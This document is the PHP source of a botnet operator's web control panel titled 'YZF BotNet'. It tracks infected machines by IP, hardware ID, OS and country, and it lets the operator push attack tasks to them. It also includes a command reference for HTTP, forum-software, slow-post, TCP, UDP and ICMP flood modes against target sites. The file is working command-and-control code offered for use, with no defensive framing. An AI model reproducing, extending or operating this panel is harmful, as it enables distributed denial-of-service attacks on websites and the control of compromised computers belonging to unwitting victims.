<?php error_reporting(0);
session_start();
include "cfg.php";
if ($_COOKIE['YZF']!=md5($password)) 
{ 
header('Location: login.php');
}
?>

<html>
<head>
<title>YZF BotNet | by V</title>
<link href="yzf.css" rel="stylesheet" type="text/css" />
<link href="tablecloth/tablecloth.css" rel="stylesheet" type="text/css" media="screen" />
<link rel="shortcut icon" href="/sys/ico.png" />
<script type="text/javascript" src="tablecloth/tablecloth.js"></script>

<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
</head>
<body>
<form action="index.php?completed=1" method="post" style="text-align:left">
<ul id="nav">
<li><a href="?stat">Statistics</a></li>
<li><a href="?bots">Bots</a></li>
<li><a href="?tasks">Taskbar</a></li>
</ul><br /><br />
<?php
include "cfg.php";
$tasks=		file_get_contents("sys/tasks.png");
$threads=	file_get_contents("sys/threads.png");

$updtasks=$_POST['updtasks'];
If (($updtasks!=$tasks) and ($updtasks!=""))
{
file_put_contents("sys/tasks.png",$updtasks);
$tasks=$updtasks;
}
$updthreads=$_POST['updthreads'];
If (($updthreads!=$threads) and ($updthreads!=""))
{
file_put_contents("sys/threads.png",$updthreads);
$threads=$updthreads;
}

If ($_GET['completed']==1)
{
echo "<br /><h2>�������!</h2><br /><b>����� ������:<br /> ".$tasks."<br /><br />Total �������: ".$threads."<br /></b>";
}

If (isset($_GET['stat']))
{
	$bd=mysql_connect($host, $user, $pass);
	mysql_select_db($base);	
	$total=	mysql_num_rows(mysql_query("Select * from bots"));
	$perday=mysql_num_rows(mysql_query("Select * from bots where (`time`>".(time()-86400).")"));
    $perhour=mysql_num_rows(mysql_query("Select * from bots where (`time`>".(time()-3600).")"));
	$online=mysql_num_rows(mysql_query("Select * from bots where (`time`>".(time()-350).")"));	
	mysql_close($bd);
	echo "<br /><br /><b>Total: <span>".$total."</span><br />Online: <span>".$online."</span><br /> Per hour: <span>".$perhour."</span><br />Per day: <span>".$perday."</span><br /><br />Total Threads: ".$threads."<br /><br />Last Task: <br /><br /><textarea rows='10' cols='60' disabled>".$tasks."</textarea><br /><br /></b>";
}
If (isset($_GET['bots']))
{
?>
<div id="container">
<?php
	$bd=mysql_connect($host, $user, $pass);
	mysql_select_db($base);	
	$packet=mysql_query("Select * from `bots` where time>".(time()-350));
	$count=mysql_num_rows($packet);
	mysql_close($bd);
	include "geoip.php";
	include "countries.php";
	$GeoIP = geoip_open('./GeoIP.dat',0);	
?>

<br />
<table  cellspacing="0" cellpadding="0">
<tr>
<th>IP</th><th>HWID</th><th>OC</th><th>CTPAHA</th>
<?php
	for ($y=0;$count>$y;$y++)
	{
		$massiv = mysql_fetch_array($packet);
		$CountryCode = geoip_country_id_by_addr($GeoIP, $massiv['ip']);
		$country=$COUNTRY_NAME[$CountryCode];
		$CountryCODE =$COUNTRY_CODE[$CountryCode];
		echo "<tr><td>".$massiv['ip']."</td><td>".$massiv['hwid']."</td><td>".$massiv['os']."</td><td><image src='country/".$CountryCODE.".gif'> ".$country."</td></tr>";
	}
	geoip_close($GeoIP);
?>
</tr>
</table>
<?php
}

If (isset($_GET['tasks']))
{
?>
  


<!--
//.downloadflood=http://WebSite.Com/image.png
//.apacheflood=http://WebSite.Com/robots.txt
//.vbulletinflood=http://forum.WebSite.ru/
//.scanflood=http://WebSite.Com/index.php
//.ontcpflood=127.0.0.1:80
//.onudpflood=127.0.0.1:53
-->

<?php
echo "<br /><br /><b>Objectives:</b><br /><br /><textarea name='updtasks' rows=10 cols=80>".$tasks."</textarea>";
echo "<br /><br /><b>Total Threads: </b><input size=5 name='updthreads' value='".$threads."'>";
echo " &nbsp; &nbsp; <input type='submit' value='Well, we go :)'  style='cursor: pointer; height: 30px;'>";
echo "<div class='mode'><strong>Modes - Teams:<p><em>WebSite.Com - Change to your domain*.</em></p></strong> 
.downloadflood=http://WebSite.Com/image.png<br>
<em>Download flood, shakes the file </em><br><br>
.apacheflood=http://WebSite.Com/robots.txt<br>
<em>Apache flood, Attacks the vulnerability of Apache</em><br><br>
.vbulletinflood=http://forum.WebSite.ru/<br>
<em>vBulletin flood, attacked the site as a forum for moving vBulletin</em><br><br>
.phpbbflood=http://forum.WebSite.ru/<br>
<em>phpBB flood, attacked the site as a forum for moving phpBB </em><br><br>
.scanflood=http://WebSite.Com/index.php<br>
<em>Scan flood, the most powerful and intelligent flood mode, the user issues the full.</em><br><br> .scanport=127.0.0.1<br>
<em>Scan Port, flood scan open ports, and an attack on them.</em> <br><br>
.yzfflood=http://WebSite.Com/index.php<br>
<em>YZF flood, corporate mode, this is only in the YZF, something like a Slow Post</em><br><br>
.timeoutflood=http://WebSite.Com/index.php<1500><br>
<em>Mode of attack on timeout, each thread makes a request to 1.5sek, 10 threads will make 10 requests for 1.5sek. </em><br><br>
.ontcpflood=127.0.0.1:80<br>
<em>Attack on TCP port </em><br><br>
.onudpflood=127.0.0.1:53<br>
<em>Attack on UDP port </em><br><br>
.icmpflood=http://WebSite.Com/<br>
<em>attack ping size 2.5kb</em><br><br></div>";
}
?>

</div></form>

</body>
</html>